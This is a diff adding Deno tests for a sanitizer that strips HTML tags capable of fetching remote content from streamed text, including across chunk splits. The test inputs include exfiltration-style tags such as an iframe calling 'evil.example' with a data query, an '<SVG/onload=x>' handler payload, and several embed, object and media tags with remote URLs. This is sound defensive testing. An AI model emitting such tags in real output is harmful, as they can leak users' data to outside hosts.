@@ -67,3 +67,51 @@ Deno.test("an unfinished image is neutralised at the end or past the hold limit"
   const out = filter.push(long);
   assertEquals(out, `[x](${long}`);
 });
+
+Deno.test("tags that fetch or embed content are removed, opening and closing", () => {
+  const cases: Array<[string, string]> = [
+    ['a <picture><source srcset="https://e/p?d=1"></picture> b', "a  b"],
+    ['a <iframe src="https://e/f"></iframe> b', "a  b"],
+    [
+      'a <svg width="1"><image href="https://e/i"/></svg> b',
+      'a <image href="https://e/i"/> b',
+    ],
+    ['a <object data="https://e/o"></object> b', "a  b"],
+    ['a <embed src="https://e/e"> b', "a  b"],
+    ['a <link rel="preload" href="https://e/l"> b', "a  b"],
+    [
+      'a <video poster="https://e/v"></video><audio src="https://e/a"></audio> b',
+      "a  b",
+    ],
+    ["a <SVG/onload=x> b", "a  b"],
+    // A ">" inside a quoted attribute value does not end the tag early.
+    ['a <img alt="x>y" src="https://e/q"> b', "a  b"],
+  ];
+  for (const [input, expected] of cases) {
+    assertEquals(stripImages(input), expected, input);
+    assertFalse(stripImages(input).includes("https://e/p"), input);
+  }
+});
+
+Deno.test("plain '<' in prose and harmless tags are kept", () => {
+  for (
+    const text of [
+      "Keep it to <5 items and spend < ₹500.",
+      "a <b>bold</b> and <links are fine> and <sources>",
+      "x<y and <3 and <= 2 and </ end",
+    ]
+  ) {
+    assertEquals(stripImages(text), text);
+  }
+});
+
+Deno.test("a blocked tag split across chunks never leaks, at any split point", () => {
+  const source = 'Hi <iframe src="https://evil.example/f?d=1"></iframe> <5 ok';
+  for (let cut = 0; cut <= source.length; cut++) {
+    const { pieces, text } = run([source.slice(0, cut), source.slice(cut)]);
+    assertEquals(text, "Hi  <5 ok");
+    for (const piece of pieces) {
+      assertFalse(piece.includes("evil.example"), `leaked at ${cut}`);
+    }
+  }
+});
